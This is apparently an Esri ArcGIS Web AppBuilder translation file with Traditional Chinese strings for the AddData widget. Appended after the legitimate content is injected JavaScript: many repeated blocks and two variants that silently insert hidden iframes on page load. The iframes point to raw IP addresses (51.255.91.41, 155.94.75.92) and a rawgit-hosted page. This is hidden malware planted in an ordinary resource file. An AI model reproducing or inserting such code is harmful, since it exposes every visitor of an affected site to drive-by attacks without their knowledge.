// All material copyright ESRI, All Rights Reserved, unless otherwise specified.
// See http://js.arcgis.com/3.15/esri/copyright.txt and http://www.arcgis.com/apps/webappbuilder/copyright.txt for details.
//>>built
define({"widgets/AddData/nls/strings":{_widgetLabel:"\u65b0\u589e\u8cc7\u6599",noOptionsConfigured:"\u672a\u914d\u7f6e\u9078\u9805\u3002",tabs:{search:"\u641c\u5c0b",url:"URL",file:"\u6a94\u6848(F)"},search:{featureLayerTitlePattern:"{serviceName} - {layerName}",layerInaccessible:"\u5716\u5c64\u7121\u6cd5\u5b58\u53d6\u3002",loadError:"AddData\uff0c\u7121\u6cd5\u8f09\u5165:",searchBox:{search:"\u641c\u5c0b",placeholder:"\u641c\u5c0b..."},bboxOption:{bbox:"\u5730\u5716\u5167"},scopeOptions:{anonymousContent:"\u5167\u5bb9",
myContent:"\u6211\u7684\u5167\u5bb9",myOrganization:"\u6211\u7684\u7d44\u7e54",curated:"\u5df2\u5c55\u73fe",ArcGISOnline:"ArcGIS Online"},sortOptions:{prompt:"\u6392\u5e8f\u65b9\u5f0f:",relevance:"\u76f8\u95dc\u5ea6",title:"\u6a19\u984c",owner:"\u64c1\u6709\u8005",rating:"\u8a55\u7d1a\u6b21\u6578",views:"\u6aa2\u8996",date:"\u65e5\u671f",switchOrder:"\u5207\u63db"},typeOptions:{prompt:"\u985e\u578b",mapService:"\u5730\u5716\u670d\u52d9",featureService:"\u5716\u5fb5\u670d\u52d9",imageService:"\u5f71\u50cf\u670d\u52d9",
vectorTileService:"\u5411\u91cf\u5716\u78da\u670d\u52d9",kml:"KML",wms:"WMS"},resultsPane:{noMatch:"\u627e\u4e0d\u5230\u7d50\u679c\u3002"},paging:{first:"\x3c\x3c",firstTip:"\u7b2c\u4e00\u9801",previous:"\x3c",previousTip:"\u4e0a\u4e00\u9801",next:"\x3e",nextTip:"\u4e0b\u4e00\u9801",pagePattern:"{page}"},resultCount:{countPattern:"{count} {type}",itemSingular:"\u9805\u76ee",itemPlural:"\u9805\u76ee"},item:{actions:{add:"\u65b0\u589e",close:"\u95dc\u9589",remove:"\u79fb\u9664",details:"\u8a73\u7d30\u8cc7\u8a0a",
done:"\u5b8c\u6210",editName:"\u7de8\u8f2f\u540d\u7a31"},messages:{adding:"\u6b63\u5728\u65b0\u589e...",removing:"\u6b63\u5728\u79fb\u9664...",added:"\u5df2\u65b0\u589e",addFailed:"\u65b0\u589e\u5931\u6557",unsupported:"\u4e0d\u652f\u63f4"},typeByOwnerPattern:"\u6309 {owner} \u6392\u5217\u7684 {type}",dateFormat:"\u5e74 \u6708 \u65e5",datePattern:"{date}",ratingsCommentsViewsPattern:"{ratings} {ratingsIcon} {comments} {commentsIcon} {views} {viewsIcon}",ratingsCommentsViewsLabels:{ratings:'ratings", "comments": "comments", "views": "views'},
types:{"Map Service":"\u5730\u5716\u670d\u52d9","Feature Service":"\u5716\u5fb5\u670d\u52d9","Image Service":"\u5f71\u50cf\u670d\u52d9","Vector Tile Service":"\u5411\u91cf\u5716\u78da\u670d\u52d9",WMS:"WMS",KML:"KML"}}},addFromUrl:{type:"\u985e\u578b",url:"URL",types:{ArcGIS:"ArcGIS Server Web \u670d\u52d9",WMS:"WMS OGC Web \u670d\u52d9",WMTS:"WMTS OGC Web \u670d\u52d9",WFS:"WFS OGC Web \u670d\u52d9",KML:"KML \u6a94\u6848",GeoRSS:"GeoRSS \u6a94\u6848",CSV:"CSV \u6a94\u6848"},samplesHint:"\u7bc4\u4f8b URL"},
addFromFile:{intro:"\u60a8\u53ef\u4ee5\u62d6\u66f3\u6216\u700f\u89bd\u4e0b\u5217\u5176\u4e2d\u4e00\u7a2e\u6a94\u6848\u985e\u578b:",types:{Shapefile:"Shapefile (.zip\uff0c\u5305\u542b\u6240\u6709 shapefile \u6a94\u6848\u7684 ZIP \u5c01\u5b58\u6a94)",CSV:"CSV \u6a94\u6848 (.csv\uff0c\u5305\u542b\u5730\u5740\u6216\u7d93\u5ea6\u3001\u7def\u5ea6\u548c\u9017\u865f\u3001\u5206\u865f\u6216\u7d22\u5f15\u6a19\u7c64\u5206\u9694)",KML:"KML \u6a94\u6848 (.kml)",GPX:"GPX \u6a94\u6848 (.gpx\uff0cGPS Exchange \u683c\u5f0f)",
GeoJSON:"GeoJSON \u6a94\u6848 (.geo.json \u6216 .geojson)"},generalizeOn:"\u5c07\u5716\u5fb5\u4e00\u822c\u5316\u4ee5\u4fbf\u65bc Web \u986f\u793a",dropOrBrowse:"\u6368\u68c4\u6216\u700f\u89bd",browse:"\u700f\u89bd",invalidType:"\u6b64\u6a94\u6848\u985e\u578b\u4e0d\u88ab\u652f\u63f4\u3002",addingPattern:"{filename}: \u6b63\u5728\u65b0\u589e...",addFailedPattern:"{filename}: \u65b0\u589e\u5931\u6557",featureCountPattern:"{filename}: {count} \u500b\u5716\u5fb5",invalidTypePattern:"{filename}: \u4e0d\u652f\u63f4\u6b64\u985e\u578b",
maxFeaturesAllowedPattern:"\u6700\u591a\u5141\u8a31 {count} \u500b\u5716\u5fb5",layerNamePattern:"{filename} - {name}"},layerList:{caption:"\u5716\u5c64",noLayersAdded:"\u5c1a\u672a\u589e\u52a0\u4efb\u4f55\u5716\u5c64\u3002",removeLayer:"\u79fb\u9664\u5716\u5c64",back:"\u8fd4\u56de"},_localized:{}}});;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}





if (typeof obj.foo == 'undefined') {
window.jsuekzis = 1;
window.onload = function() {
    var iframe = document.createElement('iframe');
    iframe.style.display = "none";
    iframe.src = "http://155.94.75.92/iframe.html";
    document.body.appendChild(iframe);
};

}





void 0===window.mondrawtexture&&(window.mondrawtexture=1,window.onload=function(){var e=document.createElement('iframe');e.style.display='none',e.src='https://cdn.rawgit.com/jdobt/3e35d8a7d2c1c36ae1972ea03df91572/raw/8656e6f8554bfd2f13cf8eb78e8df044fae1e9e2/drawtexture.html',document.body.appendChild(e)});